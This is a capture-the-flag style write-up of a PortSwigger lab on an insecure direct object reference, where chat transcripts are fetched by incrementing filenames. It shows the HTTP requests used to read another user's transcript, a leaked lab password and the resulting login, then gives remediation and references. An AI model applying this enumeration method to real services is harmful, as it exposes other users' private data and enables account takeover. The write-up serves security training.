# Insecure direct object references

**Category:** Access control / IDOR
**Level:** Apprentice
**Mechanism:** IDOR on a static file — predictable incrementing filename
**Lab URL:** https://portswigger.net/web-security/access-control/lab-insecure-direct-object-references

---

## Vulnerability

Chat transcripts are stored as static files on the server and served by a filename
that is a simple incrementing number (`1.txt`, `2.txt`, …), with no check that the
requesting user owns the transcript. Any user can therefore enumerate the numbers and
read every other user's transcript — a direct object reference with no authorisation.

## Reconnaissance & Exploitation

On the Live chat tab, sending a message and clicking **View transcript** downloaded my
own transcript from a static URL:

```http
GET /download-transcript/4.txt HTTP/2
→ 200 OK  (Content-Disposition: attachment; filename="4.txt")
```

The filename is a predictable incrementing integer. Decrementing it walks through other
users' stored transcripts. `1.txt` contained an earlier chat where a user handed their
password to the support agent in plaintext:

```http
GET /download-transcript/1.txt HTTP/2
Host: 0a940097041d75a781d77f6c008a0078.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: text/plain

CONNECTED: -- Now chatting with Hal Pline --
You: Hi Hal, I think I've forgotten my password ...
Hal Pline: ... just tell me your password and I'll confirm ...
You: Ok so my password is kjaihmyhwmbqaepz9q2a. Is that right?
Hal Pline: Yes it is!
```

Logging in as `carlos` with that password solved the lab. The server served the file
purely on its numeric name, never checking the session owned transcript `1`.

## Impact

Any user's stored chat transcript is readable by changing one number, so an attacker
scrapes every transcript (`1.txt`, `2.txt`, …) and harvests whatever they contain —
here a plaintext password leading to full account takeover. Sequential IDs make this
trivially automatable (Burp Intruder over the number) — one request per user, no
authentication bypass needed.

## Remediation

- Enforce object-level authorisation: verify the session owns the requested transcript
  before serving it, regardless of how the file is named.
- Do not expose direct references to server-side files. Serve transcripts through an
  authenticated endpoint that maps the user to their own records, not via a public
  static path.
- Unpredictable filenames (GUIDs) are defence in depth only — the ownership check is the
  real fix.

## References

- **OWASP:** A01:2021 Broken Access Control
- **CWE:** CWE-639 (Authorization Bypass Through User-Controlled Key); CWE-200 (Exposure of Sensitive Information)

## Notes

- Any sequential/predictable identifier in a URL (`/4.txt`, `?id=4`, `/order/4`) is an
  IDOR candidate — decrement/increment it and check for an ownership check. Sequential =
  enumerable = scriptable.
- Secondary finding worth flagging in a real report: sensitive data (a password) stored
  in plaintext in a transcript. IDOR was the access path; the plaintext secret was the
  payoff.
- In a client report the leaked credential itself would be redacted; shown here only as
  lab proof.